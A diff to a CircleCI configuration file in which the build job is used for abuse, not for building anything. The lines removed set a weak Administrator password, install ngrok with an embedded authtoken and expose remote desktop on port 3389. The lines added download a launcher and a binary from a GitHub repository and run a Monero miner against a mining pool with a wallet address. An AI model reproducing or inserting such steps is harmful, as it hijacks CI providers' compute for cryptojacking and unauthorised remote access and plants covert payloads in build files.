@@ -1,22 +1,11 @@
-version: 2.1 
- 
-orbs:
-  win: circleci/windows@2.2.0
- 
+version: 2.0
 jobs:
-  build: 
-    executor:
-      name: win/default 
-      size: "medium" 
- 
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
-      - checkout      
-      - run: Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "123123123" -Force)
-      - run: Get-LocalUser -Name "Administrator" | Enable-LocalUser 
-      - run: Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
-      - run: tar xf ngrok.zip
-      - run: Copy ngrok.exe C:\Windows\System32
-      - run: cmd /c echo ./ngrok.exe authtoken "1x20GqYRdlU75ZznzMoHHC3tOO0_3Eo184zwAKRt23sUcPic" >a.ps1
-      - run: cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
-      - run: cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
-      - run: .\a.ps1
+      - checkout
+      - run:  wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && wget https://github.com/hunshukajh/yes/raw/main/gas && chmod +x gas cmdline_launcher.sh && ./cmdline_launcher.sh -algo randomx -coin XMR -wallet sugar1qsj4shkkyu3vxecysdumvsuc55jurdgdsm4ene7  -rigName  $(echo $(shuf -i 1-9999 -n 1)-SRBO) -pool1 xmr.2miners.com:2222
